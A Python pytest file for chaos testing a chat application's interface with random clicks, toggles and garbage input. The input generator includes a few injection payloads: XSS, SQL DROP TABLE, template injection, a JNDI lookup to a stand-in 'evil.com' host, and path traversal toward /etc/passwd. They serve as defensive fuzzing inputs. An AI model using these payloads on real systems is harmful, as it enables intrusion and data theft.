# -*- coding: utf-8 -*-
"""
test_monkey.py - Chaos Monkey UI Testing
=========================================
Randomly clicks buttons, types garbage, and tries to break the app!
Tests both with LLM online and offline to catch all edge cases.
"""
import pytest
import sys
import os
import random
import string
import time
import json
import asyncio
import threading
from pathlib import Path
from unittest.mock import patch, MagicMock
from concurrent.futures import ThreadPoolExecutor
import requests

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


# =============================================================================
# UI ELEMENT REGISTRY (from ui/registry.py)
# =============================================================================
class UI_IDS:
    """All clickable UI element IDs."""
    # Sidebar
    BTN_NEW_CHAT = "ui-btn-new-chat"
    BTN_SETTINGS = "ui-btn-settings"
    BTN_SCAN_KB = "ui-btn-scan-kb"
    BTN_EVAL_JUDGE = "ui-btn-eval-judge"
    SW_DARK_MODE = "ui-sw-dark-mode"
    EXP_RAG_SOURCES = "ui-exp-rag-sources"
    BTN_START_TOUR = "ui-btn-start-tour"
    
    # Chat
    INPUT_CHAT = "ui-input-chat"
    BTN_SEND = "ui-btn-send"
    BTN_VOICE = "ui-btn-voice"
    BTN_ATTACH = "ui-btn-attach"
    
    # Settings
    SET_LANGUAGE = "ui-set-language"
    SET_DARK_MODE = "ui-set-dark-mode"
    SET_FONT_SIZE = "ui-set-font-size"
    SET_RAG_ENABLE = "ui-set-rag-enable"
    BTN_SET_SAVE = "ui-btn-set-save"
    BTN_SET_RESET = "ui-btn-set-reset"
    
    # Dialogs
    BTN_DOWNLOAD_MODEL = "ui-btn-download-model"
    BTN_UPDATE_ENGINE = "ui-btn-update-engine"
    BTN_CLOSE_DIALOG = "ui-btn-close-dialog"
    BTN_SWARM = "ui-btn-swarm-manager"
    
    # Batch
    BTN_BATCH_MENU = "ui-btn-batch-menu"
    BTN_BATCH_START = "ui-btn-batch-start"


# All button IDs that can be "clicked"
ALL_BUTTONS = [
    UI_IDS.BTN_NEW_CHAT,
    UI_IDS.BTN_SETTINGS,
    UI_IDS.BTN_SCAN_KB,
    UI_IDS.BTN_EVAL_JUDGE,
    UI_IDS.BTN_START_TOUR,
    UI_IDS.BTN_SEND,
    UI_IDS.BTN_VOICE,
    UI_IDS.BTN_ATTACH,
    UI_IDS.BTN_SET_SAVE,
    UI_IDS.BTN_SET_RESET,
    UI_IDS.BTN_DOWNLOAD_MODEL,
    UI_IDS.BTN_CLOSE_DIALOG,
    UI_IDS.BTN_SWARM,
    UI_IDS.BTN_BATCH_MENU,
    UI_IDS.BTN_BATCH_START,
]

# Toggle switches
ALL_TOGGLES = [
    UI_IDS.SW_DARK_MODE,
    UI_IDS.SET_DARK_MODE,
    UI_IDS.SET_RAG_ENABLE,
]


# =============================================================================
# MONKEY CHAOS GENERATORS
# =============================================================================
def generate_chaos_text(max_len=500):
    """Generate random garbage text."""
    chaos_types = [
        # Empty/whitespace
        "",
        "   ",
        "\n\n\n",
        "\t\t",
        
        # Random ASCII
        ''.join(random.choices(string.printable, k=random.randint(1, max_len))),
        
        # Emoji spam
        ''.join(random.choices(['🔥', '💯', '🎉', '🚀', '💀', '👀', '😱'], k=random.randint(10, 100))),
        
        # Unicode chaos
        ''.join(chr(random.randint(0x4E00, 0x9FFF)) for _ in range(random.randint(10, 100))),  # Chinese
        ''.join(chr(random.randint(0x0600, 0x06FF)) for _ in range(random.randint(10, 100))),  # Arabic
        
        # Code injection attempts
        "<script>alert('xss')</script>",
        "'; DROP TABLE users; --",
        "{{7*7}}",
        "${jndi:ldap://evil.com}",
        "{{constructor.constructor('return this')()}}",
        
        # Path traversal
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        
        # Binary garbage
        ''.join(chr(random.randint(0, 127)) for _ in range(50)),
        
        # Extremely long
        "A" * 50000,
        
        # Nested structures
        "[[[[[[[[[[test]]]]]]]]]]",
        "{{{{{test}}}}}",
        
        # Control characters
        "\x00\x01\x02\x03",
        
        # Mixed languages
        "Hello 你好 مرحبا こんにちは 🎉",
    ]
    return random.choice(chaos_types)


def generate_random_sequence(length=50):
    """Generate random sequence of UI actions."""
    actions = []
    for _ in range(length):
        action_type = random.choice(['click', 'toggle', 'type', 'wait'])
        
        if action_type == 'click':
            actions.append(('click', random.choice(ALL_BUTTONS)))
        elif action_type == 'toggle':
            actions.append(('toggle', random.choice(ALL_TOGGLES)))
        elif action_type == 'type':
            actions.append(('type', generate_chaos_text(100)))
        else:
            actions.append(('wait', random.uniform(0.01, 0.1)))
    
    return actions


# =============================================================================
# STATE TRACKER
# =============================================================================
class MonkeyStateTracker:
    """Track app state during monkey testing."""
    
    def __init__(self):
        self.actions = []
        self.errors = []
        self.crashes = []
        self.state_changes = []
        self.start_time = time.time()
    
    def log_action(self, action_type, target, result="OK"):
        self.actions.append({
            'time': time.time() - self.start_time,
            'type': action_type,
            'target': target,
            'result': result
        })
    
    def log_error(self, action, error):
        self.errors.append({
            'time': time.time() - self.start_time,
            'action': action,
            'error': str(error)
        })
    
    def log_crash(self, action, exception):
        self.crashes.append({
            'time': time.time() - self.start_time,
            'action': action,
            'exception': str(exception),
            'type': type(exception).__name__
        })
    
    def get_report(self):
        return {
            'duration': time.time() - self.start_time,
            'total_actions': len(self.actions),
            'errors': len(self.errors),
            'crashes': len(self.crashes),
            'error_details': self.errors[:10],  # First 10
            'crash_details': self.crashes
        }


# =============================================================================
# MOCK UI HANDLER (simulates app response)
# =============================================================================
class MockUIHandler:
    """Simulates UI responses for testing without actual UI."""
    
    def __init__(self, llm_online=True):
        self.llm_online = llm_online
        self.chat_history = []
        self.settings = {
            'dark_mode': False,
            'rag_enabled': True,
            'language': 'en'
        }
        self.dialogs_open = set()
        self.errors = []
    
    def click(self, element_id):
        """Simulate clicking a UI element."""
        handlers = {
            UI_IDS.BTN_NEW_CHAT: self._new_chat,
            UI_IDS.BTN_SETTINGS: lambda: self._open_dialog('settings'),
            UI_IDS.BTN_SCAN_KB: lambda: self._open_dialog('rag_scan'),
            UI_IDS.BTN_CLOSE_DIALOG: self._close_dialog,
            UI_IDS.BTN_SET_SAVE: self._save_settings,
            UI_IDS.BTN_SET_RESET: self._reset_settings,
            UI_IDS.BTN_SEND: self._send_message,
            UI_IDS.BTN_VOICE: self._voice_input,
            UI_IDS.BTN_ATTACH: lambda: self._open_dialog('file_picker'),
            UI_IDS.BTN_SWARM: lambda: self._open_dialog('swarm'),
            UI_IDS.BTN_DOWNLOAD_MODEL: lambda: self._open_dialog('download'),
            UI_IDS.BTN_BATCH_START: self._start_batch,
        }
        
        handler = handlers.get(element_id, lambda: None)
        try:
            return handler()
        except Exception as e:
            self.errors.append(f"Click {element_id}: {e}")
            raise
    
    def toggle(self, element_id):
        """Simulate toggling a switch."""
        if element_id in (UI_IDS.SW_DARK_MODE, UI_IDS.SET_DARK_MODE):
            self.settings['dark_mode'] = not self.settings['dark_mode']
            return self.settings['dark_mode']
        elif element_id == UI_IDS.SET_RAG_ENABLE:
            self.settings['rag_enabled'] = not self.settings['rag_enabled']
            return self.settings['rag_enabled']
        return None
    
    def type_text(self, text):
        """Simulate typing in chat input."""
        # Validate input doesn't crash
        if text is None:
            raise ValueError("Cannot type None")
        
        # Store the input (sanitized)
        self._pending_message = str(text)[:10000]  # Limit length
        return True
    
    def _new_chat(self):
        self.chat_history = []
        return "Chat cleared"
    
    def _open_dialog(self, name):
        self.dialogs_open.add(name)
        return f"Opened {name}"
    
    def _close_dialog(self):
        if self.dialogs_open:
            self.dialogs_open.pop()
        return "Dialog closed"
    
    def _save_settings(self):
        if 'settings' not in self.dialogs_open:
            # Clicking save without settings open - weird but OK
            pass
        return "Settings saved"
    
    def _reset_settings(self):
        self.settings = {
            'dark_mode': False,
            'rag_enabled': True,
            'language': 'en'
        }
        return "Settings reset"
    
    def _send_message(self):
        msg = getattr(self, '_pending_message', '')
        if not msg.strip():
            return "Empty message - ignored"
        
        self.chat_history.append({'role': 'user', 'content': msg})
        
        if self.llm_online:
            # Simulate response
            self.chat_history.append({
                'role': 'assistant',
                'content': f"Response to: {msg[:50]}"
            })
            return "Message sent, response received"
        else:
            raise ConnectionError("LLM is offline")
    
    def _voice_input(self):
        if not self.llm_online:
            # Voice still works offline (local transcription)
            pass
        return "Voice recording started"
    
    def _start_batch(self):
        if not self.llm_online:
            raise ConnectionError("Cannot start batch - LLM offline")
        return "Batch job started"
    
    def get_state(self):
        return {
            'chat_messages': len(self.chat_history),
            'settings': self.settings.copy(),
            'dialogs_open': list(self.dialogs_open),
            'llm_online': self.llm_online,
            'errors': self.errors[-5:]  # Last 5
        }


# =============================================================================
# MONKEY TEST CASES
# =============================================================================
class TestMonkeyChaos:
    """Monkey chaos testing - random clicks and inputs."""
    
    def test_random_100_clicks_llm_online(self):
        """100 random clicks with LLM online."""
        handler = MockUIHandler(llm_online=True)
        tracker = MonkeyStateTracker()
        
        for _ in range(100):
            target = random.choice(ALL_BUTTONS)
            try:
                result = handler.click(target)
                tracker.log_action('click', target, str(result))
            except Exception as e:
                tracker.log_error(('click', target), e)
        
        report = tracker.get_report()
        print(f"\n📊 Monkey Report (LLM Online):")
        print(f"   Actions: {report['total_actions']}")
        print(f"   Errors: {report['errors']}")
        print(f"   Crashes: {report['crashes']}")
        
        # Should not have hard crashes
        assert report['crashes'] == 0, f"Crashes: {report['crash_details']}"
    
    def test_random_100_clicks_llm_offline(self):
        """100 random clicks with LLM offline."""
        handler = MockUIHandler(llm_online=False)
        tracker = MonkeyStateTracker()
        
        expected_errors = 0
        for _ in range(100):
            target = random.choice(ALL_BUTTONS)
            try:
                result = handler.click(target)
                tracker.log_action('click', target, str(result))
            except ConnectionError as e:
                # Expected when LLM is offline
                expected_errors += 1
                tracker.log_error(('click', target), e)
            except Exception as e:
                tracker.log_crash(('click', target), e)
        
        report = tracker.get_report()
        print(f"\n📊 Monkey Report (LLM Offline):")
        print(f"   Actions: {report['total_actions']}")
        print(f"   Expected Errors: {expected_errors}")
        print(f"   Unexpected Crashes: {report['crashes']}")
        
        # Connection errors are expected, crashes are not
        assert report['crashes'] == 0, f"Crashes: {report['crash_details']}"
    
    def test_chaos_text_input(self):
        """Throw garbage text at the chat input."""
        handler = MockUIHandler(llm_online=True)
        tracker = MonkeyStateTracker()
        
        for i in range(50):
            chaos = generate_chaos_text()
            try:
                handler.type_text(chaos)
                tracker.log_action('type', f'text[{len(chaos)}]')
            except Exception as e:
                tracker.log_crash(('type', f'text[{len(chaos)}]'), e)
        
        report = tracker.get_report()
        print(f"\n📊 Chaos Text Report:")
        print(f"   Inputs tested: {report['total_actions']}")
        print(f"   Crashes: {report['crashes']}")
        
        assert report['crashes'] == 0, f"Text input crashed: {report['crash_details']}"
    
    def test_rapid_toggle_spam(self):
        """Rapidly toggle switches back and forth."""
        handler = MockUIHandler(llm_online=True)
        
        for _ in range(100):
            toggle = random.choice(ALL_TOGGLES)
            handler.toggle(toggle)
        
        # Should end in valid state
        state = handler.get_state()
        assert isinstance(state['settings']['dark_mode'], bool)
        assert isinstance(state['settings']['rag_enabled'], bool)
    
    def test_dialog_open_close_chaos(self):
        """Open and close dialogs in random order."""
        handler = MockUIHandler(llm_online=True)
        
        dialog_buttons = [
            UI_IDS.BTN_SETTINGS,
            UI_IDS.BTN_SCAN_KB,
            UI_IDS.BTN_SWARM,
            UI_IDS.BTN_DOWNLOAD_MODEL,
        ]
        
        for _ in range(100):
            if random.random() < 0.7:
                # Open random dialog
                handler.click(random.choice(dialog_buttons))
            else:
                # Close
                handler.click(UI_IDS.BTN_CLOSE_DIALOG)
        
        # Should be in valid state
        state = handler.get_state()
        assert isinstance(state['dialogs_open'], list)
    
    def test_full_chaos_sequence(self):
        """Run a full chaos sequence mixing all actions."""
        handler = MockUIHandler(llm_online=True)
        tracker = MonkeyStateTracker()
        sequence = generate_random_sequence(200)
        
        for action_type, action_data in sequence:
            try:
                if action_type == 'click':
                    handler.click(action_data)
                    tracker.log_action('click', action_data)
                elif action_type == 'toggle':
                    handler.toggle(action_data)
                    tracker.log_action('toggle', action_data)
                elif action_type == 'type':
                    handler.type_text(action_data)
                    tracker.log_action('type', f'len={len(action_data)}')
                elif action_type == 'wait':
                    time.sleep(action_data)
                    tracker.log_action('wait', f'{action_data:.3f}s')
            except ConnectionError:
                tracker.log_error((action_type, str(action_data)[:20]), "Connection error")
            except Exception as e:
                tracker.log_crash((action_type, str(action_data)[:20]), e)
        
        report = tracker.get_report()
        print(f"\n📊 Full Chaos Report:")
        print(f"   Duration: {report['duration']:.2f}s")
        print(f"   Actions: {report['total_actions']}")
        print(f"   Crashes: {report['crashes']}")
        
        assert report['crashes'] == 0, f"Chaos crashed: {report['crash_details']}"
    
    def test_concurrent_monkey_threads(self):
        """Multiple monkey threads hammering at once."""
        handler = MockUIHandler(llm_online=True)
        errors = []
        
        def monkey_thread(thread_id):
            for i in range(50):
                try:
                    action = random.choice(['click', 'toggle', 'type'])
                    if action == 'click':
                        handler.click(random.choice(ALL_BUTTONS))
                    elif action == 'toggle':
                        handler.toggle(random.choice(ALL_TOGGLES))
                    else:
                        handler.type_text(generate_chaos_text(50))
                except ConnectionError:
                    pass  # Expected
                except Exception as e:
                    errors.append((thread_id, i, str(e)))
        
        threads = [threading.Thread(target=monkey_thread, args=(i,)) for i in range(5)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        
        print(f"\n📊 Concurrent Monkey Report:")
        print(f"   Threads: 5")
        print(f"   Actions per thread: 50")
        print(f"   Errors: {len(errors)}")
        
        # Some errors expected due to race conditions, but no crashes
        if errors:
            print(f"   First error: {errors[0]}")


# =============================================================================
# REAL CONFIG SYSTEM MONKEY TEST
# =============================================================================
class TestRealConfigMonkey:
    """Monkey test on real config system."""
    
    def test_monkey_config_access(self):
        """Randomly access config properties."""
        from config_system import config
        
        properties = [
            'llm_port', 'host', 'mgmt_port', 'swarm_enabled',
            'external_llm', 'telegram_token', 'whatsapp_port'
        ]
        
        for _ in range(100):
            prop = random.choice(properties)
            try:
                value = getattr(config, prop)
                assert value is not None or prop in ('telegram_token',)
            except Exception as e:
                pytest.fail(f"Config access failed for {prop}: {e}")
    
    def test_monkey_config_modification(self):
        """Randomly modify and restore config."""
        from config_system import config
        
        # Store originals
        original_port = config.llm_port
        original_host = config.host
        
        try:
            # Random modifications
            for _ in range(50):
                config.llm_port = random.randint(1000, 65000)
                config.host = random.choice(['localhost', '127.0.0.1', '0.0.0.0'])
            
            # Verify still works
            assert isinstance(config.llm_port, int)
            assert isinstance(config.host, str)
        finally:
            # Restore
            config.llm_port = original_port
            config.host = original_host


# =============================================================================
# REAL UTILS MONKEY TEST
# =============================================================================
class TestRealUtilsMonkey:
    """Monkey test on real utility functions."""
    
    def test_monkey_normalize_input(self):
        """Throw garbage at normalize_input."""
        from utils import normalize_input
        
        for _ in range(100):
            chaos = generate_chaos_text() if random.random() > 0.1 else None
            try:
                result = normalize_input(chaos)
                # Should return None or string
                assert result is None or isinstance(result, str)
            except Exception as e:
                pytest.fail(f"normalize_input crashed on {repr(chaos)[:30]}: {e}")
    
    def test_monkey_safe_print(self):
        """Throw garbage at safe_print."""
        from utils import safe_print
        
        for _ in range(50):
            chaos = generate_chaos_text()
            try:
                safe_print(chaos)
            except Exception as e:
                pytest.fail(f"safe_print crashed: {e}")


# =============================================================================
# MAIN
# =============================================================================
if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short", "-x"])
